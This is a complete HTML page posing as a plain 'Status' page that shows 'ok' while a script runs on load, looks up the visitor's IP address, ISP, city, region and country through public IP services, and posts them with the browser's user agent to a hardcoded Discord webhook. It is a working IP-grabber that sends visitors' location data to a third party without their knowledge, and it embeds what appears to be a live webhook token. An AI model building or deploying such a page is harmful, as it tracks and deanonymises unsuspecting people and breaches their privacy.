<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Status</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #00ff00;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
        }
        .container {
            font-size: 3rem;
        }
        .info {
            margin-top: 20px;
            font-size: 1rem;
            color: #00cc00;
        }
    </style>
</head>
<body>
    <div class="container">
        ok
        <div class="info" id="status">Collecting info...</div>
    </div>

    <script>
        // === CONFIGURE YOUR DISCORD WEBHOOK HERE ===
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
        // ===========================================

        async function sendToDiscord(data) {
            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("YOUR_WEBHOOK_ID")) {
                console.error("Please replace the webhook URL");
                document.getElementById('status').innerHTML = 'Error: Set webhook URL';
                return;
            }

            const payload = {
                content: "🔍 **New Connection Detected**",
                embeds: [{
                    title: "Visitor Info",
                    color: 0x00ff00,
                    fields: [
                        { name: "IP", value: data.ip || "Unknown", inline: true },
                        { name: "ISP", value: data.org || data.isp || "Unknown", inline: true },
                        { name: "City", value: data.city || "Unknown", inline: true },
                        { name: "Region", value: data.region || data.state || "Unknown", inline: true },
                        { name: "Country", value: data.country_name || data.country || "Unknown", inline: true },
                        { name: "User Agent", value: navigator.userAgent.substring(0, 200), inline: false },
                        { name: "Time", value: new Date().toISOString(), inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    document.getElementById('status').innerHTML = '✅ Info sent to Discord';
                } else {
                    document.getElementById('status').innerHTML = '⚠️ Sent (check Discord)';
                }
            } catch (e) {
                console.error(e);
                document.getElementById('status').innerHTML = '❌ Failed to send';
            }
        }

        async function getIPInfo() {
            try {
                // Using ipapi.co (free, no key needed for basic use)
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw new Error('Failed');
                const data = await res.json();
                
                document.getElementById('status').innerHTML = `
                    IP: ${data.ip}<br>
                    ISP: ${data.org || 'Unknown'}
                `;
                
                await sendToDiscord(data);
            } catch (e) {
                console.error(e);
                // Fallback IP only
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    document.getElementById('status').innerHTML = `IP: ${ipData.ip}`;
                    await sendToDiscord({ ip: ipData.ip });
                } catch (fallbackErr) {
                    document.getElementById('status').innerHTML = 'Failed to get IP';
                }
            }
        }

        // Run immediately
        window.onload = getIPInfo;
    </script>
</body>
</html>
